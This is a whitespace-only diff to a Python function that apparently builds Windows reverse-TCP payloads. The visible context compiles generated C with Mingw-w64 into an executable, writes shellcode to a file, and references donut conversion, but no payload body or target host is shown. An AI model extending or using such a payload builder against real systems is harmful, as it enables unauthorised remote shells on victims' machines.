@@ -92,7 +92,7 @@ def generate_exe_reverse_tcp(ip, port, stager_ip, stager_port):
 	try:
 		with os.fdopen(fd, "w") as f:
 			f.write(raw)
-		
+
 		# 3) compile with Mingw‑w64 as x86_64 Windows exe
 		exe_path = c_path[:-2] + ".exe"
 		gcc = shutil.which("x86_64-w64-mingw32-gcc") or "x86_64-w64-mingw32-gcc"
@@ -101,7 +101,7 @@ def generate_exe_reverse_tcp(ip, port, stager_ip, stager_port):
 			"-static",
 			"-O2",
 			c_path,
-			"-o", exe_path,                
+			"-o", exe_path,
 			"-lws2_32",
 			"-m64",
 		]
@@ -128,7 +128,7 @@ def generate_exe_reverse_tcp(ip, port, stager_ip, stager_port):
 
 		with open(sc_path, "wb") as f:
 			f.write(shellcode)
-		
+
 		"""with open(sc_path, "rb") as f:
 			donut_file = f.read()
 
